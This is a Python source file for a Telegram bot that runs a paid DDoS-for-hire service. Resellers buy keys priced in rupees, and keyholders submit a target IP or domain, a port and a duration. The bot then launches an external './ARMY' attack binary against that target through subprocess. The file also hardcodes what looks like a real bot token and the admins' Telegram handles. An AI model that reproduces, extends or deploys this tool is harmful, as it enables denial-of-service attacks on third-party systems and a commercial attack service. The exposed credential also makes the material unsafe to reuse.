import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
import re
from telebot import types
from dateutil.relativedelta import relativedelta

# Initialize Telegram bot
bot = telebot.TeleBot('8147615549:AAGwT0ppniPc4UqlgtB-akzN9t0B4djMTAY')

# Admin user IDs with usernames and nicknames
admin_id = {
    "6955279265": {"username": "@DDOS_VVIP"},
    "6258297180": {"username": "@Rahul_618", "nickname": "Rahul"},
    "1807014348": {"username": "@sadiq9869", "nickname": "Master Owner"},
    "1866961136": {"username": "@Rohan2349", "nickname": "Rohan Guru"}
}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"

# Per key cost for resellers (in Rs)
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}

# Load users and keys from files
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"ARMY-PK-{random_key.upper()}"
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "No data found."
            else:
                file.truncate(0)
                return "Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Load resellers and their balances
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

# Initialize resellers data
resellers = load_resellers()

# Admin command to add a reseller
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝗮𝗱𝗱 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "�_U𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱_𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗮𝗹𝗮𝗻𝗰𝗲>")
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗮𝗺𝗼𝘂𝗻𝘁❗️")
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅\n\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗: {reseller_id}\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"❗️𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀")

# Command to generate keys (Admins bypass balance check)
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        return
    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻")
        return
    cost = KEY_COST[duration]
    key = create_random_key()
    keys[key] = {"duration": duration, "expiration_time": None}
    save_keys()
    if user_id in admin_id:
        response = f"✅ 𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 (𝗔𝗱𝗺𝗶𝗻) ✅\n\n�_K𝗲𝘆: `{key}`\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}"
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)
            response = f"✅ 𝗞𝗲𝘆 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅\n\n𝗞𝗲𝘆: `{key}`\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}\n𝗖𝗼𝘀𝘁: {cost} Rs\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[user_id]} Rs"
        else:
            response = f"❗️𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝘁𝗼 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲 {duration} 𝗸𝗲𝘆\n𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱: {cost} Rs\n𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲: {resellers[user_id]} Rs"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    bot.reply_to(message, response, parse_mode='Markdown')

# Admin command to display help
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "🚫 *ACCESS DENIED* 🚫\n\n⚠️ *This command is restricted to admins only.*", parse_mode='Markdown')
        return
    try:
        help_text = """
💎 *𝗨𝗟𝗧𝗥𝗔 𝗣𝗥𝗢 𝗠𝗔𝗫 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟* 💎
━━━━━━━━━━━━━━━━━━━━━━━
🔥 *𝗔𝗗𝗠𝗜𝗡 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦* 🔥
✅ Admins have *unlimited access* to all commands
✅ No cooldowns, balance checks, or expiration restrictions

🔥 *𝗕𝗢𝗧 𝗖𝗢𝗡𝗧𝗥𝗢𝗟𝗦:* 🔥
🚀 `/start` - *Ignite the bot & enter the HQ!*
📖 `/help` - *Summon this legendary guide!*

⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:* ⚡
🏦 `/add_reseller <user_id> <balance>` - *Empower a new reseller!* 🔥
🔑 `/genkey <duration>` - *Craft a VIP key (no cost for admins)!* 🛠️
📜 `/logs` - *Unveil recent logs & secret records!* 📂
👥 `/users` - *Summon the roster of authorized warriors!*
❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
🏅 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
🗑️ `/remove_reseller <reseller_id>` - *Erase a reseller’s existence!* ⚰️

💣 *𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗡𝗧𝗥𝗢𝗟𝗦:* 💣
🚀 `🚀 Attack` - *Launch an attack (no cooldown for admins)!*
👤 `👤 My Info` - *View your supreme admin stats!*
🎟️ `🎟️ Redeem Key` - *Redeem keys (optional for admins)!*

💡 *𝗘𝗫𝗔𝗠𝗣𝗟𝗘 𝗠𝗔𝗚𝗜𝗖:*  
`/genkey 1day` - *Forge a VIP key for 24 hours!* ⏳
`/add_reseller 123456789 1000` - *Add a reseller with 1000 Rs balance!*
━━━━━━━━━━━━━━━━━━━━━━━
💬 *In need of divine guidance? You are the divine admin!* 👑
"""
        bot.reply_to(message, help_text, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ *Error:* {str(e)}", parse_mode='Markdown')

# Reseller command to check balance
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "💰 𝗔𝗱𝗺𝗶𝗻: 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗯𝗮𝗹𝗮𝗻𝗰𝗲"
    elif user_id in resellers:
        current_balance = resellers[user_id]
        response = f"💰 𝗬𝗼𝘂𝗿 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗶𝘀: {current_balance} Rs"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗿 𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
    bot.reply_to(message, response)

# Handle key redemption prompt
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if user_id in admin_id:
        bot.reply_to(message, "✅ 𝗔𝗱𝗺𝗶𝗻: 𝗡𝗼 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗿𝗲𝗱𝗲𝗲𝗺 𝗸𝗲𝘆𝘀, 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗮𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱!")
        return
    if key in keys:
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, f"❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
                return
            else:
                del users[user_id]
                save_users()
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"✅ �_A𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱!\n\n𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

# Admin command to show logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻�_d")
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "No data found"
        bot.reply_to(message, response)

# Start command to display main menu
@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)

COOLDOWN_PERIOD = 60  # 1 minute cooldown for non-admins

# Handle attack command
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)
    elif user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄❗️"
            bot.reply_to(message, response)
            return
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)
    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n OWNER :- @rahul_618!"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()
    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])
            if time > 240 and user_id not in admin_id:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target):
                    response = "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘁𝗮𝗿𝗴𝗲𝘁 𝗳𝗼𝗿𝗺𝗮𝘁 (𝗺𝘂𝘀𝘁 𝗯𝗲 𝗜𝗣 𝗼𝗿 𝗱𝗼𝗺𝗮𝗶𝗻)❗️"
                    bot.reply_to(message, response)
                    return
                if not (1 <= port <= 65535):
                    response = "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝗺𝘂𝘀𝘁 𝗯𝗲 𝟭-𝟲𝟱𝟱𝟯𝟱)❗️"
                    bot.reply_to(message, response)
                    return
                record_command_logs(user_id, 'attack', target, port, time)
                log_command(user_id, target, port, time)
                full_command = ["./ARMY", target, str(port), str(time), "800"]
                username = message.chat.username or "No username"
                response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                subprocess.Popen(full_command)
                threading.Timer(time, send_attack_finished_message, [message.chat.id, target, port, time]).start()
                if user_id not in admin_id:
                    last_attack_time[user_id] = datetime.datetime.now()
        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
    bot.reply_to(message, response)

def send_attack_finished_message(chat_id, target, port, time):
    message = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅"
    bot.send_message(chat_id, message)

# Handle user info request
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    if user_id in admin_id:
        role = "Admin"
        key_expiration = "Unlimited Access"
        balance = "Unlimited"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]
        balance = "Not Applicable"
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🚹 𝗥𝗼𝗹𝗲: {role}\n"
        f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {key_expiration}\n"
    )
    if role == "Reseller":
        response += f"💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} Rs\n"
    elif role != "Admin":
        response += f"💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance}\n"
    bot.reply_to(message, response)

# Admin command to list authorized users
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
    if users:
        response = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {user}\n  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n  𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻: {formatted_expiration}\n\n"
    else:
        response = "⚠️ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."
    bot.reply_to(message, response, parse_mode='Markdown')

# Admin command to remove a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺�_i𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝗨𝘀𝗲𝗿_𝗜𝗗>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        response = f"✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱"
    else:
        response = f"⚠️ 𝗨𝘀𝗲�_r {target_user_id} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁"
    bot.reply_to(message, response)

# Admin command to show resellers
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
    resellers_info = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 ✅\n\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id).username else "Unknown"
            resellers_info += f"• 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{reseller_username}\n  𝗨𝘀𝗲𝗿𝗜𝗗: {reseller_id}\n  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} Rs\n\n"
    else:
        resellers_info += "𝗡𝗼 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗳𝗼𝘂𝗻𝗱"
    bot.reply_to(message, resellers_info)

# Admin command to add balance to a reseller
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>")
            return
        reseller_id = command_parts[1]
        amount = float(command_parts[2])
        if reseller_id not in resellers:
            bot.reply_to(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
            return
        resellers[reseller_id] += amount
        save_resellers(resellers)
        bot.reply_to(message, f"✅ 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝗱𝗱𝗲𝗱 ✅\n\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {amount} Rs\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗: {reseller_id}\n𝗡𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]} Rs")
    except ValueError:
        bot.reply_to(message, "𝗜𝗻𝘃�_a𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁")

# Admin command to remove a reseller
@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲_𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝗿𝗲𝘀𝗲𝗹𝗹𝗲�_r_𝗶𝗱>")
            return
        reseller_id = command_parts[1]
        if reseller_id not in resellers:
            bot.reply_to(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
            return
        del resellers[reseller_id]
        save_resellers(resellers)
        bot.reply_to(message, f"𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆")
    except ValueError:
        bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 �_r𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗")

# Main execution block
if __name__ == "__main__":
    load_data()
    bot.remove_webhook()  # Delete any existing webhook to enable polling
    print("Webhook deleted, starting polling...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)  # Wait before retrying